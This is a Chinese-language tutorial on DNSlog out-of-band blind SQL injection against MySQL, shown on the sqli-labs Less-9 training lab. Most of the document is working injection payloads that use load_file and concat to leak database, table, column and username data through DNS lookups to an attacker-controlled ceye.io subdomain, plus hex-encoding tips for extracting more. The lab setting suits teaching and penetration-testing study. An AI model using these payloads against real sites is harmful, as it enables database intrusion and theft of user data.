## DNS

DNS 通俗来讲就是把网址（即域名）解析为IP 地址。

dnslog注入原理通过子查询，将内容拼接到域名内，让load_file()去访问共享文件，访问的域名被记录此时变为显错注入,将盲注变显错注入,读取远程共享文件，通过拼接出函数做查询,拼接到域名中，访问时将访问服务器，记录后查看日志

## DNSlog工具

如果有自己的服务器和域名，可以自建一个这样的平台，直接使用BugScan团队开源的工具搭建即可：

[
_https://github.com/BugScanTeam/DNSLog_](https://github.com/BugScanTeam/DNSLog)

另外我们也可以使用在线平台：

[ _http://ceye.io_](http://ceye.io/)

[ _http://www.dnslog.cn_](http://www.dnslog.cn/)

### 什么情况下使用dnslog注入？

 ** **大家在****[ _渗透测试_](http://bbs.ichunqiu.com/portal.php) **
**的时候可能会遇到一下这些情况：****

> 挖到一个有SQL盲注的站点，可是用sqlmap跑需要频繁请求，最后导致ip被ban
>
> 发现疑似命令注入的洞，但是目标站点什么也不显示，无法确认是不是有洞

总之就是目标不让信息显示出来，如果能发送请求，那么就可以尝试咱这个办法——用DNSlog来获取回显

（1）SQL注入中的盲注

（2）XSS盲打

（3）无回显的命令执行

（4）无回显的SSRF

（5）无回显的XXE（Blind XXE）

### Mysql
DNSlog原理图![1626268529_60eee371ede97ccdf9eb0.png!small?1626268530371](https://image.3001.net/images/20210714/1626268529_60eee371ede97ccdf9eb0.png!small?1626268530371)

### DNSlog盲注利用条件

mysql.ini中secure_file_priv必须为空

> （1）当secure_file_priv为null，不允许导入导出
>
> （2）当secure_file_priv为/tmp导入导出只能在/tmp目录下。
>
> （3）当secure_file_priv为空，则不作限制允许导入导出（注意NULL不是我们要的空，NULL和空的类型不一样）

### DNSlog盲注操作方式

Payload1：

    
    
    ?Id=1’and load_file(concat('\\\\',(select database()),'.c4d3hg.ceye.io\\sql'))--+
    //相应的更换 select database()查询语句便可以实现DNS外带的回显注入，其中c4d3hg.ceye.io为ceye.io平台给每个账号的昵称

 ** **查询当前数据库：****

    
    
    and load_file(concat('\\\\',(select database()),'.c4d3hg.ceye.io\\sql'))--+
    //xtftm5.ceye.io根据ceye平台给你的域名更改，\\sql是域名目录，随意即可，select database()换成sql注入payload即可

 ** **查询表名：****

    
    
    and load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='security'limit 0,1),'.c4d3hg.ceye.io\\sql'))--+

 ** **查询列名：****

    
    
    and load_file(concat('\\\\',(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),'.c4d3hg.ceye.io\\sql'))--+

 ** **查询数据：****

    
    
    and load_file(concat('\\\\',(select username from users limit 0,1),'.c4d3hg.ceye.io\\sql'))--+

Payload2：

    
    
    and (select load_file(concat('\\\\',(select database()),'.c4d3hg.ceye.io\\aaa')))#

原理跟上面差不多

## 实战演练

Sqllab的第9关

这里就要借用一个平台： _<http://ceye.io>_

![1626268689_60eee411b91a7dad11fa1.png!small?1626268689951](https://image.3001.net/images/20210714/1626268689_60eee411b91a7dad11fa1.png!small?1626268689951)

 ** **查询当前数据库名：****

    
    
    http://127.0.0.1/sqllab/Less-9/?id=1'and load_file(concat('\\\\',(select database()),'.c4d3hg.ceye.io\\sql'))--+

![1626268713_60eee42920f8528632b38.png!small?1626268713117](https://image.3001.net/images/20210714/1626268713_60eee42920f8528632b38.png!small?1626268713117)

回显的数据

![1626268723_60eee43360cafc71599ff.png!small?1626268725107](https://image.3001.net/images/20210714/1626268723_60eee43360cafc71599ff.png!small?1626268725107)

 ** **查询当前数据库的第一个表名：****

    
    
    http://127.0.0.1/sqllab/Less-9/?id=1'and load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='security'limit 0,1),'.c4d3hg.ceye.io\\sql'))--+

![1626268773_60eee4654f0a1b325ef13.png!small?1626268773449](https://image.3001.net/images/20210714/1626268773_60eee4654f0a1b325ef13.png!small?1626268773449)

可以看到这里成返回了第一个表的名字

依次类推可以推出users表

 ** **查询第users表一个列名：****

    
    
    http://127.0.0.1/sqllab/Less-9/?id=1'and load_file(concat('\\\\',(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),'.c4d3hg.ceye.io\\sql'))--+

![1626268799_60eee47f0c2f9d0845d0e.png!small?1626268798947](https://image.3001.net/images/20210714/1626268799_60eee47f0c2f9d0845d0e.png!small?1626268798947)

 ** **查询users表的username列的数据：****

http://127.0.0.1/sqllab/Less-9/?id=1'and load_file(concat('\\\\\\\',(select
username from users limit 0,1),'.c4d3hg.ceye.io\\\sql'))--+

![1626268814_60eee48e0b6e4d99d9953.png!small?1626268813976](https://image.3001.net/images/20210714/1626268814_60eee48e0b6e4d99d9953.png!small?1626268813976)

##  ** **需要注意的点：****

 ** **1.**** **
**查询当前用户时,因为结果中有@符号，使用dnslog注入时，需要使用hex函数进行转码，再将查询到的hex转码后的数据解码即可，如下：****

 ** **如果使用group_concat函数进行快读查询，也同样需要hex转码，利用如下：****

    
    
    http://127.0.0.1/sqllab/Less-9/?id=1'and load_file(concat('\\\\',(select hex(group_concat(table_name)) from information_schema.tables where table_schema='security'),'.c4d3hg.ceye.io\\sql'))--+

![1626268850_60eee4b26a7955fc144e7.png!small?1626268850513](https://image.3001.net/images/20210714/1626268850_60eee4b26a7955fc144e7.png!small?1626268850513)

![1626268862_60eee4be97d15b52c7aff.png!small?1626268862589](https://image.3001.net/images/20210714/1626268862_60eee4be97d15b52c7aff.png!small?1626268862589)

查询到的是hex编码的结果

![1626268884_60eee4d43a1d2a403355a.png!small?1626268884241](https://image.3001.net/images/20210714/1626268884_60eee4d43a1d2a403355a.png!small?1626268884241)

  

